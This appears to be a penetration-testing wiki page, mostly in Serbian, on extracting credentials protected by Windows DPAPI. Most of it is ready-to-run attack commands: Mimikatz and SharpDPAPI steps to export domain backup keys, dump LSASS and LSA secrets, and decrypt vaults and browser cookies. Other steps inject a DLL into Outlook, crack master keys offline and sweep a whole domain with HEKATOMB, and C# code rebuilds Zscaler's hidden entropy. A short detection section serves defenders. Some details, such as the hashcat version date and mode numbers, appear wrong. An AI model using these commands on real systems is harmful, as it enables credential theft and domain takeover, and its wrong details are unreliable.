# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

Data Protection API (DPAPI) se primarno koristi u Windows operativnom sistemu za **simetričnu enkripciju asimetričnih privatnih ključeva**, koristeći ili korisničke ili sistemske tajne kao značajan izvor entropije. Ovakav pristup pojednostavljuje enkripciju za developere omogućavajući im da šifruju podatke koristeći ključ izveden iz korisničkih logon tajni ili, za sistemsku enkripciju, iz sistemskih tajni autentifikacije domena, čime se eliminiše potreba da developeri sami upravljaju zaštitom ključa za enkripciju.

Najčešći način korišćenja DPAPI je preko funkcija **`CryptProtectData` i `CryptUnprotectData`**, koje omogućavaju aplikacijama da sigurno enkriptuju i dekriptuju podatke u okviru sesije procesa koji je trenutno prijavljen. To znači da šifrovani podaci mogu biti dekriptovani samo od strane istog korisnika ili sistema koji ih je šifrovao.

Pored toga, ove funkcije prihvataju i **`entropy`** parametar koji se takođe koristi prilikom enkripcije i dekripcije, tako da, da biste dekriptovali nešto što je šifrovano korišćenjem ovog parametra, morate obezbediti istu entropy vrednost koja je korišćena pri enkripciji.

### Generisanje korisničkog ključa

DPAPI generiše jedinstveni ključ (zvan **`pre-key`**) za svakog korisnika na osnovu njihovih kredencijala. Ovaj ključ je izveden iz korisničke lozinke i drugih faktora, a algoritam zavisi od tipa korisnika, ali na kraju rezultuje SHA1. Na primer, za korisnike domena, **zavisi od NTLM hasha korisnika**.

Ovo je posebno interesantno zato što, ako napadač može da pribavi hash korisničke lozinke, on može:

- **Dekriptovati bilo koje podatke koji su šifrovani koristeći DPAPI** tim korisničkim ključem bez potrebe da kontaktira bilo koji API
- Pokušati da **crackuje lozinku** offline pokušavajući da generiše validan DPAPI ključ

Pored toga, svaki put kada korisnik enkriptuje podatke korišćenjem DPAPI, generiše se novi **master key**. Taj master key je onaj koji se zapravo koristi za enkripciju podataka. Svakom master ključu je pridružen **GUID** (Globally Unique Identifier) koji ga identifikuje.

Master ključevi se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` Security Identifier tog korisnika. Master ključ je sačuvan šifrovan korisnikovim **`pre-key`** i takođe pomoću **domain backup key** radi oporavka (dakle isti ključ je sačuvan šifrovan 2 puta pomoću 2 različita ključa).

Imajte na umu da **domain key koji se koristi za enkripciju master ključa postoji na domain controller-ima i nikad se ne menja**, tako da ako napadač ima pristup domain controller-u, može pribaviti domain backup key i dekriptovati master ključeve svih korisnika u domenu.

Šifrovani blobovi sadrže **GUID master ključa** koji je korišćen za enkripciju podataka unutar svog header-a.

> [!TIP]
> DPAPI šifrovani blobovi počinju sa **`01 00 00 00`**

Pronalaženje master ključeva:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Ovo je ključ koji koristi mašina za enkripciju podataka. Bazira se na **DPAPI_SYSTEM LSA secret**, što je poseban ključ kojem može pristupiti samo SYSTEM korisnik. Ovaj ključ se koristi za enkriptovanje podataka koji moraju biti dostupni samom sistemu, kao što su kredencijali na nivou mašine ili sistemski tajni podaci.

Imajte na umu da ovi ključevi **nemaju domain backup**, pa im se može pristupiti samo lokalno:

- **Mimikatz** može doći do njega dumpovanjem LSA secrets koristeći komandu: `mimikatz lsadump::secrets`
- Tajna se čuva u registry-ju, tako da administrator može **izmeniti DACL permisije da bi joj pristupio**. Putanja u registry-ju je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Među ličnim podacima koje štiti DPAPI nalaze se:

- Windows creds
- Internet Explorer i Google Chrome lozinke i podaci za automatsko popunjavanje
- Lozinke e-mail i unutrašnjih FTP naloga za aplikacije kao što su Outlook i Windows Mail
- Lozinke za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući enkripcijske ključeve
- Lozinke za remote desktop konekcije, .NET Passport i privatne ključeve za razne svrhe enkripcije i autentifikacije
- Mrežne lozinke koje upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i drugi
- Enkriptovani blobovi unutar registry-ja
- ...

Sistemski zaštićeni podaci uključuju:
- Wifi lozinke
- Lozinke za scheduled task-ove
- ...

### Master key extraction options

- Ako korisnik ima domain admin privilegije, može pristupiti **domain backup key** da dekriptuje sve korisničke master ključeve u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa lokalnim admin privilegijama, moguće je **pristupiti LSASS memoriji** i izvući DPAPI master keys svih povezanih korisnika i SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima local admin privileges, može pristupiti **DPAPI_SYSTEM LSA secret** kako bi dešifrovao machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ako je password ili hash NTLM korisnika poznat, možete **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste u sesiji kao korisnik, moguće je zatražiti DC za **backup key to decrypt the master keys using RPC**. Ako ste lokalni admin i korisnik je prijavljen, možete za ovo **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI šifrovanim podacima

### Pronalaženje DPAPI šifrovanih podataka

Obično se korisničke **zaštićene datoteke** nalaze u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Takođe proverite zamenu `\Roaming\` sa `\Local\` u gore navedenim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI šifrovane blobove u datotečnom sistemu, registru i B64 blobovima:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Imajte na umu da [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može se koristiti za dekriptovanje osetljivih podataka (npr. cookies) pomoću DPAPI.

### Pristupni ključevi i podaci

- **Koristite SharpDPAPI** da dobijete kredencijale iz DPAPI šifrovanih fajlova iz trenutne sesije:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Dobijte informacije o credentials** kao šifrovane podatke i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Dekriptiraj masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Alat **SharpDPAPI** takođe podržava sledeće argumente za dešifrovanje masterkey-a (primetite kako je moguće koristiti `/rpc` da biste dobili backup ključ domena, `/password` za upotrebu plaintext lozinke, ili `/pvk` da biste naveli DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifruj podatke koristeći masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava sledeće argumente za dešifrovanje `credentials|vaults|rdg|keepass|triage|blob|ps` (imajte na umu da je moguće koristiti `/rpc` da biste dobili rezervni ključ domena, `/password` da biste koristili plain-text lozinku, `/pvk` da navedete DPAPI domain private key file, `/unprotect` da iskoristite sesiju trenutnog korisnika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Dešifruj neke podatke koristeći **trenutnu korisničku sesiju**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Handling Optional Entropy ("Third-party entropy")

Neke aplikacije prosleđuju dodatnu vrednost **entropy** funkciji `CryptProtectData`. Bez te vrednosti blob ne može biti dekriptovan, čak i ako je ispravan masterkey poznat. Dobijanje **entropy** je stoga neophodno kada ciljate kredencijale zaštićene na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je DLL u korisničkom režimu koji hook-uje DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaki opciono prosleđeni **entropy**. Pokretanje EntropyCapture u **DLL-injection** režimu nad procesima kao što su `outlook.exe` ili `vpnclient.exe` će kreirati fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćeni **entropy** se kasnije može proslediti **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dekriptovali.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Krekovanje masterkey fajlova offline (Hashcat & DPAPISnoop)

Microsoft je uveo format masterkey-a **context 3** počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (decembar 2023) je dodao hash-mode-ove **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3) koji omogućavaju GPU-akcelerisano krekovanje korisničkih lozinki direktno iz masterkey fajla. Napadači stoga mogu da izvrše word-list ili brute-force napade bez interakcije sa ciljnim sistemom.

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može да parsira Credential and Vault blobs, dešifruje ih pomoću cracked keys i eksportuje cleartext passwords.


### Pristup podacima drugog računara

U **SharpDPAPI and SharpChrome** možete navesti opciju **`/server:HOST`** да pristupite podacima udaljenog računara. Naravno, morate imati pristup tom računaru, и u sledećem primeru pretpostavlja se da je **ključ za enkripciju rezervne kopije domena poznat**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma i ekstrakciju domain controller backup key kroz RPC. Skripta zatim razrešava IP adrese svih računara i izvršava smbclient na svim računarima kako bi preuzela sve DPAPI blobs svih korisnika i dešifrovala sve sa domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa liste računara izvučene iz LDAP-a možete pronaći sve podmreže čak i ako ih ranije niste poznavali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski da iskopava tajne zaštićene DPAPI-jem. 2.x izdanje je uvelo:

* Paralelno prikupljanje blobs sa stotina hostova
* Parsiranje **context 3** masterkeys i automatska Hashcat integracija za crackovanje
* Podrška za Chrome "App-Bound" encrypted cookies (vidi sledeći odeljak)
* Novi **`--snapshot`** režim za ponovljeno ispitivanje endpointa i diff novokreiranih blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može da ispisuje Hashcat/JtR formate i opcionalno automatski poziva crackovanje. Potpuno podržava machine i user masterkey formate do Windows 11 24H1.

## Uobičajene detekcije

- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim DPAPI-povezanim direktorijumima.
- Posebno sa mrežnog share-a kao što su **C$** ili **ADMIN$**.
- Korišćenje **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristupanje LSASS memoriji ili dumpovanje masterkeys.
- Događaj **4662**: *Izvršena je operacija nad objektom* – može se korelisati sa pristupom **`BCKUPKEY`** objektu.
- Događaj **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ranjivosti i promene u ekosistemu

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom je mogao prevariti članicu domena da preuzme maliciozni DPAPI backup key, što je omogućavalo dešifrovanje korisničkih masterkey-a. Zakrpljeno u novembarskom cumulative update-u 2023 – administratori treba da obezbede da su DC-ovi i radne stanice potpuno ažurirani.
* **Chrome 127 “App-Bound” cookie encryption** (jul 2024) zamenio je legacy DPAPI-only zaštitu dodatnim ključem koji se čuva pod korisnikovim **Credential Manager**. Offline dekriptovanje kolačića sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da oporave dodatni ključ kada se pokreću u korisničkom kontekstu.

### Studija slučaja: Zscaler Client Connector – Prilagođena entropija izvedena iz SID-a

Zscaler Client Connector čuva nekoliko konfiguracionih fajlova pod `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan pomoću **DPAPI (Machine scope)** ali vendor isporučuje **prilagođenu entropiju** koja se *izračunava za vreme izvršavanja* umesto da se čuva na disku.

Entropija se rekonstruiše iz dva elementa:

1. Hard-coded secret ugrađen u `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem konfiguracija pripada.

Algoritam koji implementira DLL je ekvivalentan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Pošto je tajna ugrađena u DLL koji može da se pročita sa diska, **bilo koji lokalni napadač sa SYSTEM pravima može da ponovo generiše entropiju za bilo koji SID** i dešifruje blobove offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dešifrovanje otkriva kompletnu JSON konfiguraciju, uključujući svaki **device posture check** i njegovu očekivanu vrednost – informacija koja je veoma vredna pri pokušajima zaobilaženja na strani klijenta.

> SAVET: ostali šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) su zaštićeni sa DPAPI **bez** entropije (`16` zero bytes). Stoga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` nakon što su dobijene SYSTEM privilegije.

## Reference

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
